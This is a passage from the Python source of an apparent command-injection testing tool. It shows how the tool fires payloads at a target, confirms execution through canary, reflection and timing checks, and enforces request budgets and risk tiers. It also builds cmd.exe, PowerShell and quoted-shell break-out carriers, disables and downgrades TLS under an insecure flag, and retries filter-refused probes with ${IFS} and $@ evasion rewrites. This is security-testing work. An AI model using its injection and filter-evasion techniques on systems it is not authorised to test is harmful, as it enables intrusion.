        useless. The run is honest about having measured nothing, and the sink
        behind that handshake is never tested at all.

        So the security level is lowered here too, and the minimum protocol
        version with it. This does not widen the operator's exposure. With
        ``check_hostname = False`` and ``CERT_NONE`` the connection is already
        unauthenticated, so an active attacker is already unconstrained;
        accepting a 1024-bit key or a SHA-1 signature on top of that gives away
        nothing that was still being held. What it buys is the difference
        between testing the target and reporting that it could not be reached.

        ``--insecure`` is the flag that says TLS assurance is not what this run
        is for. This makes it mean that consistently rather than halfway.

        Built whatever the target's scheme is. urllib follows a redirect with
        the handler it was given, so an ``http://`` target that lands on a
        self-signed or legacy ``https://`` one needs this context as much as a
        direct HTTPS target does -- withholding it there made ``--insecure``
        silently stop working on exactly the flow it was reached for.

        Saying so is a separate question, and :meth:`_announce_insecure` answers
        it: the transcript must describe what this run actually did, and a TLS
        downgrade reported on a run that opened no TLS connection is the same
        defect as a probe reported that was never sent."""
        if not getattr(self, "insecure", False):
            return None
        ctx = getattr(self, "_insecure_ctx", None)
        if ctx is None:
            import ssl
            import warnings
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            # Each rung is refused by some builds rather than all of them, and a
            # context that lost one is still better than no context: a build
            # that will not go below TLS 1.2 can still be handed a weak-key
            # certificate, which is the commoner of the two failures. Which ones
            # took is recorded, because the notice names what was applied rather
            # than what was attempted.
            applied = ["no certificate or hostname check"]
            try:
                ctx.set_ciphers("DEFAULT@SECLEVEL=0")
                applied.append("OpenSSL security level 0")
            except ssl.SSLError:
                logger.debug("OpenSSL build refuses SECLEVEL=0; keeping its default.")
            try:
                with warnings.catch_warnings():
                    # Python deprecates naming TLS 1.0. Pointing a security tool
                    # at software older than 1.2 is the case this exists for, so
                    # the notice is suppressed rather than printed at an operator
                    # who cannot act on it.
                    warnings.simplefilter("ignore", DeprecationWarning)
                    ctx.minimum_version = ssl.TLSVersion.TLSv1
                applied.append("TLS 1.0 allowed")
            except (ValueError, OSError):
                logger.debug("OpenSSL build refuses TLS 1.0; keeping its minimum version.")
            self._insecure_ctx = ctx
            self._insecure_applied = applied
        return ctx

    def _announce_insecure(self, url: Optional[str]) -> None:
        """Say once that this run gave up its TLS assurances, when it did.

        Called with the URL about to be fetched and again with the one actually
        reached, because a plain-HTTP target may redirect into TLS. Neither a
        generation-only run nor ``--doctor`` ever gets here, and a run that
        stays on HTTP never opened the connection this describes.

        The line names the rungs that *took*. Each is applied in its own
        ``try`` because some OpenSSL builds refuse one and not the other, so
        listing both unconditionally would make the transcript claim something
        the build had declined."""
        if not getattr(self, "insecure", False) or getattr(self, "_insecure_said", False):
            return
        if not url or not str(url).lower().startswith("https"):
            return
        applied = getattr(self, "_insecure_applied", None) or ["no certificate or hostname check"]
        self._insecure_said = True
        print("[!] --insecure: TLS is unverified AND downgraded for this run ("
              + ", ".join(applied) + ") so that legacy targets complete a handshake. "
              "The connection carries no authenticity guarantee.")

    def run_verification(self, records: Iterator[PayloadRecord], url: str, method: str = "GET",
                         data: Optional[str] = None, headers: Optional[List[str]] = None,
                         delay: float = 0.0, timeout: float = 8.0,
                         max_payloads: Optional[int] = None,
                         url_location: str = "query_value",
                         body_location: Optional[str] = None) -> List[Dict[str, Any]]:
        """Fire payloads at an AUTHORISED target and confirm execution via each
        payload's oracle (match regex / canary token / timing). The FUZZ marker in
        the URL / data / headers is replaced with the payload, encoded for the
        injection point it lands in: ``url_location`` for the URL, ``body_location``
        for the request body (auto-detected from Content-Type/body shape when not
        given), and single-line escaping for headers.
        """
        import time

        resolved_body_location = body_location or self._detect_body_location(data, headers)
        if data is not None:
            logger.info("Verification body injected as '%s'", resolved_body_location)

        def fire(payload: str, req_timeout: Optional[float] = None):
            return self._fire(payload, url, method, data, headers, url_location,
                              resolved_body_location, req_timeout or timeout)

        # Baseline from several benign requests: a single sample can be a cold
        # start or a jitter spike, which would poison every timing verdict. Take
        # a robust centre (median) plus a noise-aware margin (floored, but at
        # least a few times the observed spread), and keep one payload-free body
        # as the control for the reflection differential.
        import statistics

        baseline_samples: List[float] = []
        control_body = ""
        for _ in range(3):
            _, cbody, sample = fire(f"rcekit-baseline-{self._generate_canary()}")
            baseline_samples.append(sample)
            control_body = cbody
        baseline = statistics.median(baseline_samples)
        spread = max(baseline_samples) - min(baseline_samples)
        noise = 3 * spread

        results: List[Dict[str, Any]] = []
        seen: Set[str] = set()
        for record in records:
            if record.payload in seen:
                continue
            seen.add(record.payload)
            is_timing = record.expected_channel == "timing" or record.blocking
            # Adapt the confirmation threshold and the request timeout to the
            # payload's own expected delay. A known short sleep (e.g. 1s) only
            # needs to clear the measured noise plus half its expected delay, so
            # it is no longer unverifiable under the old flat 2s floor; an unknown
            # delay keeps the conservative 2s floor. The timeout is stretched past
            # the expected delay so the sleep can complete instead of timing out.
            expected = (record.expected_delay_ms / 1000.0) if (is_timing and record.expected_delay_ms) else None
            if expected is not None:
                margin = max(0.5, noise, 0.5 * expected)
                req_timeout = max(timeout, baseline + expected + 2.0)
            else:
                margin = max(2.0, noise)
                req_timeout = timeout
            status, body, elapsed = fire(record.payload, req_timeout if is_timing else None)
            # Only a candidate delay is worth a confirmatory re-fire; this keeps
            # the extra request off the vast majority of payloads.
            elapsed_confirm: Optional[float] = None
            if is_timing and status is not None and elapsed - baseline >= margin:
                _, _, elapsed_confirm = fire(record.payload, req_timeout)
            # Paired negative control for a reflected canary. The canary token
            # sits verbatim in the payload, so a target that merely echoes input
            # returns it without executing anything. Re-fire the SAME token in an
            # inert carrier (no command structure) at the same injection point:
            # if the token still comes back, the match is reflection, not
            # execution, and _evaluate_verify downgrades it to inconclusive. Only
            # done when the primary actually matched, so it costs nothing on the
            # vast majority of payloads.
            #
            # The gate must use the SAME encoded-aware search the verdict uses:
            # with a plain re.search here, a target that wraps its output (base64,
            # hex, url, html) skipped the control entirely while _evaluate_verify
            # still matched through the wrapper — so pure reflection was reported
            # as 'confirmed', precisely in the case _encoded_search exists for.
            reflection_control = control_body
            if (record.token and record.match and not is_timing
                    and record.expected_channel != "interactsh"
                    and status is not None and self._encoded_search(record.match, body)):
                _, reflection_control, _ = fire(f"rcekit-control-{record.token}")
            verdict, detail = self._evaluate_verify(
                record, status, body, elapsed, baseline, margin, reflection_control, elapsed_confirm)
            results.append({
                "verdict": verdict, "detail": detail, "status": status,
                "payload": record.payload, "category": record.category,
                "environment": record.environment, "context": record.context,
                "encoding": record.encoding, "token": record.token,
            })
            if delay:
                time.sleep(delay)
            if max_payloads and len(results) >= max_payloads:
                break
        return results

    # How many times an aggregate method may answer with a further probe batch.
    # The timing method needs three (two screening waves, then the regression);
    # the fourth is slack, so a method that grows a phase is not silently
    # truncated. The bound exists so a buggy method cannot drive the engine
    # forever against a live target.
    MAX_PROBE_ROUNDS = 4

    @staticmethod
    def _quoted_shell_carriers(carriers: List[PayloadRecord],
                               carrier_seen: Set[Tuple[str, str]],
                               config: Dict[str, Any]) -> List[PayloadRecord]:
        """Extra carriers for the shell-quoted break-out contexts.

        ``shell_single_quoted``/``shell_double_quoted`` are exactly the contexts
        that fit a ``ping '<input>'`` sink -- input interpolated inside quotes,
        which every probe built for an unquoted context fails to escape. The
        generator has always had them, but they are not in ``default_contexts``,
        so no record carried them and the detection engine never tried them: the
        one sink shape they exist for was the one shape that could not be
        detected at all. They are cheap (self-separating, so one body each).

        The substitution contexts ride here too, for the same reason and with
        the same shape of argument: ``$(...)`` and backticks reach a sink whose
        value sits inside double quotes *without closing the quote*, which is
        the one case a quoted break-out loses to a filter on the quote itself.

        Which contexts are added follows ``--sink-shape``, so naming a rung
        narrows this rather than bypassing it. It follows the carrier's *sink
        dialect* too: cmd.exe has no comment character to swallow the sink's
        tail and no command-substitution syntax, so all three of these rungs
        were previously built for it as payloads it cannot execute -- four
        carriers' worth of requests per Windows run that could only ever come
        back negative. PowerShell takes the quote break-outs and ``$( )`` but
        not the backtick, which is its escape character rather than a
        substitution.

        Skipped when the operator named ``--contexts`` explicitly -- a narrowed
        run is a deliberate choice about what to send, and widening it behind
        the operator's back is not this function's call."""
        if config.get("contexts_explicit"):
            return []
        shapes = config.get("sink_shapes")
        extra: List[PayloadRecord] = []
        for record in list(carriers):
            if record.environment not in SHELL_CAPABLE_ENVIRONMENTS:
                continue
            table = SINK_SHAPE_CONTEXTS_BY_ENV.get(sink_env_for(record, config), {})
            for rung in SINK_SHAPE_RUNGS:
                if rung not in table or (shapes and rung not in shapes):
                    continue
                for context in table[rung]:
                    key = (record.environment, context)
                    if key in carrier_seen:
                        continue
                    carrier_seen.add(key)
                    extra.append(dataclass_replace(record, context=context))
        return extra

    @staticmethod
    def _windows_dialect_carriers(carriers: List[PayloadRecord],
                                  carrier_seen: Set[Tuple[str, str]],
                                  config: Dict[str, Any]) -> List[PayloadRecord]:
        """cmd.exe and PowerShell carriers for the runtimes that are Windows-first.

        ``dotnet`` reaches a shell (``Process.Start``) like every other runtime
        in ``SHELL_CAPABLE_ENVIRONMENTS``, and every one of them takes the Unix
        shape because a language runtime does not say which OS it runs on. For
        .NET that default is backwards: the corpus ships a ``dotnet``
        environment precisely because the application is a Windows one often
        enough to be worth naming, and it was the one runtime whose probes could
        never confirm on the platform it is most associated with.

        Two extra carriers, not a third dialect for every runtime: the Unix
        shape stays (ASP.NET Core on Linux is real), and an operator who knows
        the OS says so with ``--sink-env`` rather than paying for both. Skipped
        when the dialect is pinned -- the operator has already answered this --
        and when ``--contexts`` narrows the run by hand."""
        if config.get("sink_env") or config.get("contexts_explicit"):
            return []
        extra: List[PayloadRecord] = []
        for record in list(carriers):
            if record.environment != "dotnet":
                continue
            for context in ("windows_cmd", "powershell"):
                key = (record.environment, context)
                if key in carrier_seen:
                    continue
                carrier_seen.add(key)
                extra.append(dataclass_replace(record, context=context))
        return extra

    @staticmethod
    def same_origin(first: str, second: str) -> bool:
        """Whether two URLs share scheme, host and effective port."""
        default_ports = {"http": 80, "https": 443}

        def origin(url: str):
            parts = urllib.parse.urlsplit(url)
            scheme = (parts.scheme or "").lower()
            try:
                port = parts.port
            except ValueError:  # malformed port -- treat as its own origin
                return None
            return scheme, (parts.hostname or "").lower(), port or default_ports.get(scheme)

        left, right = origin(first), origin(second)
        return left is not None and left == right

    def _followup_headers(self, request_url: str, followup_url: str,
                          headers: Optional[List[str]]) -> Optional[List[str]]:
        """Headers to carry on a read-back fetch.

        The write executes with the run's headers; the fetch used to go out bare.
        With a web root that rarely mattered -- static file serving is usually
        unauthenticated. A generalised read-back channel is an *application*
        endpoint (a download, export or attachment handler, an LFI parameter),
        and those are usually behind a session. The write would succeed, the
        fetch would get a 401, and the verdict would be ``negative`` on an
        exploitable target.

        Credentials are carried only to the **same origin** as the request under
        test. A read-back URL on another host is someone else's server, and
        replaying the target's session cookie or bearer token to it would leak
        the credential -- so those headers are dropped there and the rest still
        go. Content-Type and Content-Length describe a body this GET does not
        have."""
        if not headers:
            return None
        same = self.same_origin(request_url, followup_url)
        kept: List[str] = []
        for header in headers:
            name = header.partition(":")[0].strip().lower()
            if name in {"content-type", "content-length"}:
                continue
            if not same and name in self.SENSITIVE_HEADERS:
                continue
            kept.append(header)
        return kept or None

    def _detection_carriers(self, records: Iterator[PayloadRecord],
                            config: Dict[str, Any]) -> List[PayloadRecord]:
        """Reduce the selected records to distinct ``(environment, context)``
        carriers, plus the extra quoted/substitution carriers.

        Shared by the run and by the cost estimate, so the number printed before
        firing is derived from the same reduction that decides what is fired."""
        carriers: List[PayloadRecord] = []
        carrier_seen: Set[Tuple[str, str]] = set()
        for record in records:
            key = (record.environment, record.context)
            if key in carrier_seen:
                continue
            carrier_seen.add(key)
            carriers.append(record)
        # Dialect carriers first: they are ordinary carriers, so the quoted /
        # substitution break-outs are then offered to them on the same terms as
        # to every other carrier rather than being a shape only Unix ever gets.
        carriers.extend(self._windows_dialect_carriers(carriers, carrier_seen, config))
        carriers.extend(self._quoted_shell_carriers(carriers, carrier_seen, config))
        return carriers

    def estimate_detection_probes(self, records: List[PayloadRecord], methods: List[str],
                                  config: Optional[Dict[str, Any]] = None,
                                  max_payloads: Optional[int] = None) -> int:
        """How many requests a detection run would send, without sending any.

        The ladder and the carrier list both multiply probe count, and
        enumeration multiplies it again by the number of candidate points. An
        operator on a monitored engagement has to be able to see that number
        *before* it happens rather than infer it from the traffic, so this
        builds the probes and counts them.

        ``max_payloads`` mirrors the run's own stopping point, so the figure
        stays true exactly when the budget guard the operator reached for is in
        play — an estimate that ignores ``--max-payloads`` is wrong precisely
        when someone is trying to bound the run.

        A floor, not an exact figure: an aggregate method may answer with
        further screening waves once it has seen the first batch, and each
        payload-free control adds one request per run."""
        rng = random.Random(0)
        carriers = self._detection_carriers(records, config or {})
        total = 0
        seen: Set[str] = set()
        for name in methods:
            if name not in DETECTION_METHODS:
                continue
            meth = DETECTION_METHODS[name](self, config)
            for record in carriers:
                if not meth.applicable(record):
                    continue
                try:
                    probes = meth.build_probes(record, rng)
                except Exception:  # a cost estimate must never break the run
                    continue
                # *Both* gates the run itself applies, so the figure describes
                # the run about to happen rather than one without the operator's
                # declared profile or risk tier. A cost line that ignores a
                # filter is wrong precisely for the operator who narrowed the
                # run on purpose -- and with per-probe rungs it was wrong by a
                # factor of three for `lookup` at the default tier. The
                # predicate is shared with the run and counts nothing, so an
                # estimate never moves the numbers the report prints.
                sendable, _ = meth.filter_probes(probes)
                sendable = [p for p in sendable if self._safety_allows(meth, p)]
                if getattr(meth, "aggregate", False):
                    # Follow the same branch the run takes when the profile
                    # empties a wave: the method is not finished, so it is asked
                    # for the next one. Without this the floor reads zero on
                    # exactly the configuration the run now sends probes for --
                    # a floor of zero on a run that fires is not a conservative
                    # estimate, it is a wrong one, and this line is either an
                    # audit or it is noise.
                    #
                    # It stays a floor. A wave the method chooses *after seeing
                    # timings* cannot be predicted from here, which is why the
                    # docstring says what it says; only the waves it will hand
                    # over regardless are counted.
                    for _round in range(self.MAX_PROBE_ROUNDS - 1):
                        if sendable or not probes:
                            break
                        try:
                            probes = meth.next_probes([])
                        except Exception:  # an estimate must never break the run
                            probes = []
                        sendable, _ = meth.filter_probes(probes)
                    # The same decision the run makes, so the line and the
                    # traffic agree. A method that answers only from the whole
                    # series is all or nothing: counting a truncated one here
                    # would promise requests the run will not send, and
                    # counting the cap would promise a bound it will not keep.
                    remaining = None if not max_payloads else max(0, max_payloads - total)
                    if remaining is not None and not meth.decides_per_probe():
                        # All or nothing, the same rule the run applies wave by
                        # wave: counting a truncated series here would promise
                        # requests the run will not send.
                        if remaining < len(sendable):
                            continue
                    elif remaining is not None:
                        sendable = sendable[:remaining]
                    total += len(sendable)
                    if max_payloads and total >= max_payloads:
                        return total
                    continue
                probes = sendable
                for probe in probes:
                    if probe.payload in seen:
                        continue
                    seen.add(probe.payload)
                    total += 1
                    if max_payloads and total >= max_payloads:
                        return max_payloads
        return total

    @staticmethod
    def _safety_ceiling(meth: "DetectionMethod") -> int:
        """The highest rung this method may send at, in this run.

        Three things decide it, and leaving any one out has been a bug:

        * the run's tier, when one was declared;
        * the method's own rung otherwise -- it was selected, so what it needs
          to run at all is allowed, and this filter exists for shapes that
          reach past that;
        * the method's own rung *regardless*, when its configuration is its
          gate. ``--methods file --webroot ... --web-base-url ...`` is accepted
          by the pre-flight for exactly that reason, and a runtime filter
          holding every probe afterwards would accept the command and then
          report `nothing-tested` -- the quietest way this tool can fail.
        """
        declared = SAFETY_ORDER.get(meth.config.get("max_safety") or meth.safety, 0)
        if meth.gated_by_config:
            return max(declared, SAFETY_ORDER.get(meth.safety, 0))
        return declared

    def _safety_allows(self, meth: "DetectionMethod", probe: "Probe") -> bool:
        """Whether this run may send this probe shape. Counts nothing."""
        return SAFETY_ORDER.get(meth.probe_safety(probe), 1) <= self._safety_ceiling(meth)

    def _escalate(self, meth: "DetectionMethod", probe: "Probe",
                  record: "PayloadRecord", url: str,
                  method: str, data: Optional[str], headers: Optional[List[str]],
                  url_location: str, body_location: str, timeout: float,
                  control_status: Optional[int],
                  started_requests: int = 0,
                  max_payloads: Optional[int] = None
                  ) -> Optional[Tuple[str, Any, Any, Any, float]]:
        """Re-send a refused probe, climbing the rungs to the run's ceiling.

        Only a refused probe is retried, which is the whole design. Measured
        shape by shape against an unfiltered target, applying a rung to every
        probe broke 8 shapes the canonical form executes and improved none;
        against a filter that blocks whitespace it turned 1 confirmation into
        6. The rung is worth its cost exactly where something was refused.

        Returns the first attempt a filter did not refuse, as
        ``(payload, status, body, channels, elapsed)``, or None when every rung
        was refused too. Bounded by construction: at most one request per rung.

        The transform is applied to the payload as sent rather than before the
        context wrapper, which is safe for these two rungs and only these two:
        neither ``${IFS}`` nor ``$@`` carries a character any context escapes,
        so the wrapping cannot change underneath them. What the wrapper does
        change is the quote state the body starts in, which ``opens_closed``
        carries.

        Unix shell probes only. ``${IFS}`` and ``$@`` are POSIX, and a cmd.exe
        or PowerShell probe rewritten with them loses its spaces -- so a
        whitespace filter answers 200, the retry counts as a win, and a
        vulnerable target reports `negative` instead of `blocked`. The rung
        would be manufacturing the false clean the verdict beside it exists to
        remove."""
        ceiling = self.config_evade
        if ceiling == "none":
            return None
        if ">" in probe.payload:
            # A shape whose command redirects is left canonical. The build-time
            # transform took an explicit `evade=False` for these, and that
            # parameter stopped doing anything when the rung became a retry --
            # so the guard is restored here, where the retry now happens.
            #
            # bash does run `echo X${IFS}>${IFS}/path` and writes the file;
            # measured. The guard predates this change and names other shells,
            # and a cross-shell measurement is not something this environment
            # can produce, so it stays rather than being removed on one shell's
            # say-so.
            return None
        if meth._sink_env(record) != "unix":
            return None
        # A break-out context opens with the quote it is closing, so the body
        # after that quote is outside quotes rather than inside.
        prefix = (self.contexts.get(record.context) or {}).get("prefix") or ""
        opens_closed = prefix[-1:] in ("'", '"')
        for rung in EVASION_RUNGS[1:]:
            # Per rung, not once before the ladder. One refused probe can be
            # retried at `low` and again at `high`, so a budget checked only at
            # the call site let a single probe spend three requests -- measured
            # as 11 requests against `--max-payloads 10 --evade high`.
            if self._budget_spent(started_requests, max_payloads):
                return None
            climbed = evade_body(probe.payload, rung, opens_closed=opens_closed)
            if climbed == probe.payload:
                continue
            status, body, chans, elapsed = self._fire_channels(
                climbed, url, method, data, headers, url_location, body_location,
                timeout)
            # A retry is a request the target receives, so it is charged to the
            # same meter as the probe that prompted it. `escalated_probes`
            # counts these too, but that number describes the ladder rather
            # than the traffic -- and `--max-payloads` is spent against
            # `delivered_probes`. Measured before this line existed: a
            # `--max-payloads 5 --evade high` run against a filter that refuses
            # whitespace put 12 requests on the target and recorded 5.
            self.delivered_probes += 1
            self.escalated_probes += 1
            if not payload_refused(status, control_status):
                self.escalation_wins[rung] = self.escalation_wins.get(rung, 0) + 1
                return climbed, status, body, chans, elapsed
            if rung == ceiling:
                break
        return None

    def _refusal(self, status: Optional[int], control_status: Optional[int],
                 verdict: "Verdict", every: bool = False) -> Optional["Verdict"]:
        """The `blocked` verdict for a refused probe, or None to keep what the
        method decided.

        Only a `negative` is replaced. Every other verdict rests on something
        the run *observed* -- a computed value, a callback, a parser
        fingerprint -- and a 4xx does not unmake it: an application that
        executes the payload and then answers 400 with the output in the body
        has still executed it. Overwriting that would turn demonstrated RCE
        into a false negative, which is the one outcome worse than the false
        clean this verdict exists to remove.

        `negative` is exactly the claim a refusal contradicts: it says the
        probes reached the target and found nothing, and they reached a
        filter."""
        if not payload_refused(status, control_status):
            return None
        self.refused_probes += 1
        self.refused_statuses[status] = self.refused_statuses.get(status, 0) + 1
        if verdict.status != "negative":
            return None
        if every:
            return Verdict("blocked",
                           f"a filter refused every probe (HTTP {status}) where the "
                           "payload-free control got through -- the sink never saw one")
        return Verdict("blocked",
                       f"a filter refused the payload (HTTP {status}) where the "
                       "payload-free control got through -- the sink never saw it")

    def _budget_spent(self, started_requests: int,
                      max_payloads: Optional[int]) -> bool:
        """Whether ``--max-payloads`` is used up for this call, counted in
        *requests* rather than in result rows.

        Rows were the wrong meter, and quietly so: for a per-probe method they
        are the same number. They come apart wherever a method spends requests
        without producing one row each -- an aggregate series is one row
        however many probes it cost, and a series the budget abandons is no row
        at all, so the next carrier recomputed the same allowance and fired
        again."""
        return bool(max_payloads) and (self.delivered_probes - started_requests) >= max_payloads

    def _note_reach(self, meth: "DetectionMethod", probe: "Probe") -> None:
        """Record a probe that reaches past the run's tier and goes anyway."""
        rung = probe.reaches_past
        if not rung or SAFETY_ORDER.get(rung, 0) <= self._safety_ceiling(meth):
            return
        note = f"{meth.name}/{probe.carrier or 'probe'} reaches {rung}"
        self.reach_noted_probes += 1
        self.reach_notes[note] = self.reach_notes.get(note, 0) + 1

    def _apply_safety_tier(self, meth: "DetectionMethod",
                           probes: "List[Probe]") -> "List[Probe]":
        """Hold back the probe shapes this run's risk tier does not allow, and
        note the ones that reach past it and are sent anyway.

        Three tallies, because they say three different things and one number
        would state the wrong one about all of them. A profile drop means the
        probe *could not have* reached the sink. A safety hold means it could,
        and the operator chose not to send it. A reach note means it did --
        further than the tier asked for, with an effect the notice undoes."""
        kept: "List[Probe]" = []
        for probe in probes:
            if self._safety_allows(meth, probe):
                self._note_reach(meth, probe)
                kept.append(probe)
                continue
            reason = (f"{meth.name}/{probe.carrier or 'probe'} needs "
                      f"--verify-active-risk {meth.probe_safety(probe)}")
            self.safety_held_probes += 1
            self.safety_held_reasons[reason] = self.safety_held_reasons.get(reason, 0) + 1
        return kept

    def _apply_target_profile(self, meth: "DetectionMethod",
                              probes: "List[Probe]") -> "List[Probe]":
        """Drop the probes the declared target profile rules out, and record it.

        Tallies onto the generator rather than returning a count, because a run
        filters in several places -- one call per method per carrier, repeated
        for every wave and every injection point -- and the operator needs one
        honest number at the end, not a line per carrier."""
        kept, reasons = meth.filter_probes(probes)
        for reason in reasons:
            self.profile_dropped_probes += 1
            self.profile_drop_reasons[reason] = self.profile_drop_reasons.get(reason, 0) + 1
        return self._apply_safety_tier(meth, kept)

    def run_detection(self, records: Iterator[PayloadRecord], url: str,
                      methods: List[str], method: str = "GET",
                      data: Optional[str] = None, headers: Optional[List[str]] = None,
                      delay: float = 0.0, timeout: float = 8.0,
                      max_payloads: Optional[int] = None,
                      url_location: str = "query_value",
                      body_location: Optional[str] = None,
                      config: Optional[Dict[str, Any]] = None,
                      rng: Optional["random.Random"] = None) -> List[Dict[str, Any]]:
        """Method-driven RCE detection against an AUTHORISED target.

        For each selected :class:`DetectionMethod`, build probes from the
        applicable records, fire them through the shared delivery layer
        (:meth:`_fire`), optionally fetch a followup (file-based methods), and
        confirm each against a single payload-free control body. Every result
        carries ``method`` and ``tier`` so ``executed`` and the weaker tiers
        are never collapsed into each other in reporting.

        This is additive: it does not alter the classic ``run_verification``
        oracle path, and only runs when the operator opts in via ``--methods``.
        """
        import time
        rng = rng or random.Random()
        # `first` stops a carrier at its first confirmation; `every` maps every
        # shape the sink accepts, which is what an operator writing a proof of
        # concept by hand actually wants.
        confirm_depth = (config or {}).get("confirm_depth") or "first"
        # The ceiling a refused probe may climb to. `none` disables the retry.
        self.config_evade = (config or {}).get("evade") or "none"
        resolved_body_location = body_location or self._detect_body_location(data, headers)
        selected = [DETECTION_METHODS[name](self, config) for name in methods
                    if name in DETECTION_METHODS]

        # One payload-free control for the reflection differential: the computed
        # value must be absent from every one of its channels for a confirmation
        # to hold.
        # The status is kept, not discarded: a probe refused where this got
        # through is a payload a filter rejected, and that is not a negative.
        control_status, control_body, control_channels, _ = self._fire_channels(
            f"rcekit-control-{self._generate_canary()}", url, method, data, headers,
            url_location, resolved_body_location, timeout)

        # The observed channel's control has to be taken *before* any probe is
        # sent, not after: the whole premise is that a probe changes what that
        # endpoint renders, so a control taken afterwards would already contain
        # what it is supposed to rule out.
        observe = observe_request(config or {})
        observe_control: List[Tuple[str, str]] = []
        observe_reached = False
        if observe is not None:
            o_status, o_body, o_channels, _ = self._fire_observed(observe, timeout)
            observe_reached = o_status is not None
            observe_control = o_channels or ([("response body", o_body)] if o_body else [])

        # Reduce records to distinct (environment, context) carriers so the same
        # probe shape is not refired for every payload sharing that carrier.
        carriers = self._detection_carriers(records, config or {})

        results: List[Dict[str, Any]] = []
        seen: Set[str] = set()
        # What the budget is spent against. Rows were the wrong meter: a series
        # the budget abandons costs requests and produces no row, so the next
        # carrier recomputed the same allowance and fired again -- `time` at
        # `--max-payloads 5` sent 4 requests per carrier with the cap never
        # moving. Requests are what the operator asked to bound.
        started_requests = self.delivered_probes
        for meth in selected:
            for record in carriers:
                if not meth.applicable(record):
                    continue
                if getattr(meth, "aggregate", False):
                    # Fire the whole probe series (e.g. a timing regression) and
                    # decide once. Each fire's timeout is stretched past its
                    # intended delay so a genuine sleep completes instead of
                    # timing out.
                    #
                    # A method may answer with further probes (next_probes) once
                    # it has seen the batch -- screening cheaply before paying
                    # for an expensive measurement. Rounds are bounded so a
                    # method cannot loop the engine.
                    series: List[Tuple[Probe, Observation]] = []
                    # `built` is what the method offered; `batch` is what the
                    # declared profile allows to be sent. The two are tracked
                    # apart on purpose. A wave the profile emptied is NOT a
                    # method that has run out of ideas: an adaptive method holds
                    # its separators back in waves, and a filter that removes the
                    # first wave's usually leaves later ones intact -- a sink
                    # that strips ';' and '|' still takes '&&', a newline, or the
                    # bare command. Treating an emptied wave as the end skipped
                    # every one of those and reported `nothing-tested` for a sink
                    # the ladder could still have reached.
                    built = meth.build_probes(record, rng)
                    # The budget is a bound on requests, and it used to be
                    # checked only *after* the series had been fired -- against
                    # the number of result rows, which for an aggregate method
                    # is one however many probes it cost. Measured at
                    # `--max-payloads 1`: `time` sent 12, `deser` 15 and
                    # `boolean` 27, while the cost line printed before the
                    # traffic said 1.
                    #
                    # What the budget may do about it depends on where the
                    # method's answer lives, which the class already knows.
                    # Where each probe answers, spending the last of the budget
                    # simply stops the series. Where only the series answers,
                    # a part of one is not a weaker answer but a wrong one, so
                    # the whole method is declined by name.
                    budget = None if not max_payloads else max(
                        0, max_payloads - (self.delivered_probes - started_requests))
                    fired = 0
                    abandoned: Optional[str] = None
                    for _round in range(self.MAX_PROBE_ROUNDS):
                        batch = self._apply_target_profile(meth, built)
                        if budget is not None and fired + len(batch) > budget:
                            if not meth.decides_per_probe():
                                # All or nothing, per wave. `time` answers
                                # `negative` from a screen with no regression
                                # behind it and from a regression short of four
                                # samples -- honest answers to "no separator
                                # delayed", and false cleans when the real
                                # reason was that the budget ran out. So a wave
                                # that does not fit abandons the method for this
                                # carrier and emits no row, rather than letting
                                # a partial series be judged.
                                abandoned = (
                                    f"{meth.name}/{record.context} could not finish its "
                                    f"series within --max-payloads (needed "
                                    f"{fired + len(batch)} requests, budget {budget})")
                                break
                            # Where each probe carries its own verdict, the
                            # ones that went out keep theirs and the rest are
                            # simply not sent.
                            batch = batch[:max(0, budget - fired)]
                        for probe in batch:
                            fired += 1
                            req_timeout = timeout + (probe.delay_s or 0.0) + 2.0
                            status, body, chans, elapsed = self._fire_channels(
                                probe.payload, url, method, data, headers, url_location,
                                resolved_body_location, req_timeout)
                            self.delivered_probes += 1
                            # The same retry the per-probe path makes. `time`,
                            # `oob`, `lookup` and `deser` live in this branch,
                            # and leaving it out meant the documented ceiling
                            # did nothing for four of the eight methods -- the
                            # same branch, and the same omission, as the
                            # refusal check itself a change ago.
                            # The retry is a request too, so it only goes out
                            # while the budget still covers one. Without this
                            # the bound overshot by one on the last probe of a
                            # capped run: a probe cannot be known to be refused
                            # until it has been sent.
                            if (payload_refused(status, control_status)
                                    and not self._budget_spent(started_requests,
                                                               max_payloads)):
                                climbed = self._escalate(
                                    meth, probe, record, url, method, data, headers,
                                    url_location, resolved_body_location, req_timeout,
                                    control_status, started_requests, max_payloads)
                                if climbed is not None:
                                    sent, status, body, chans, elapsed = climbed
                                    probe = dataclass_replace(probe, payload=sent)
                            series.append((probe, Observation(
                                status=status, body=body, control_body=control_body,
                                elapsed=elapsed, channels=chans,
                                control_channels=control_channels)))
                            if delay:
                                time.sleep(delay)
                        if not built:
                            break
                        if (budget is not None and fired >= budget
                                and meth.decides_per_probe()):
                            # Only where each probe answers. Breaking here for a
                            # method that answers from the series was a false
                            # clean of my own making: the screen wave fit the
                            # budget, the regression did not, and the loop fell
                            # through to a verdict built from screen probes
                            # alone -- `negative`, "no command separator
                            # produced a delay", against a target that really
                            # did delay. Measured at `--max-payloads 4` and 12
                            # on a sink that honours an injected sleep. A
                            # series the budget cut short is abandoned by the
                            # wave check below, not judged.
                            break
                        # A screening wave's follow-up probes go through the same
                        # gate: a method that answers with a second round of
                        # separators must not smuggle a denied one back in. The
                        # round cap still bounds this, so a method whose every
                        # wave is filtered cannot spin the engine.
                        built = meth.next_probes(series)
                    if abandoned is not None:
                        self.budget_held_series += 1
                        self.budget_held_reasons[abandoned] = (
                            self.budget_held_reasons.get(abandoned, 0) + 1)
                        # A row, not a silent drop. Emitting nothing left the
                        # run to be described by whatever the *other* carriers
                        # said, and the other carriers are the ones with
                        # nothing to find: measured at `--max-payloads 12`
                        # against a sink that honours an injected sleep, the
                        # unix carrier's regression was abandoned and a windows
                        # carrier's honest "no separator delayed" became the
                        # run's verdict -- `negative`, for a target that was
                        # vulnerable.
                        #
                        # `inconclusive` is what this is, in the word the tool
                        # already uses: evidence that could not be attributed,
                        # because the run never gathered it. It outranks
                        # `negative` in the run verdict, so one held-back
                        # measurement is enough to stop the whole run reading
                        # clean.
                        results.append({
                            "verdict": "inconclusive", "detail": abandoned,
                            "status": None, "payload": "",
                            "method": meth.name, "tier": meth.tier,
                            "environment": record.environment, "context": record.context,
                            "category": "detection", "expected": "",
                        })
                        continue
                    if not series:
                        # The method built no probes for this carrier, so there
                        # is nothing to judge. Falling through would ask an
                        # aggregate method to decide from zero samples, and its
                        # honest answer to that ("no delay was observed", "no
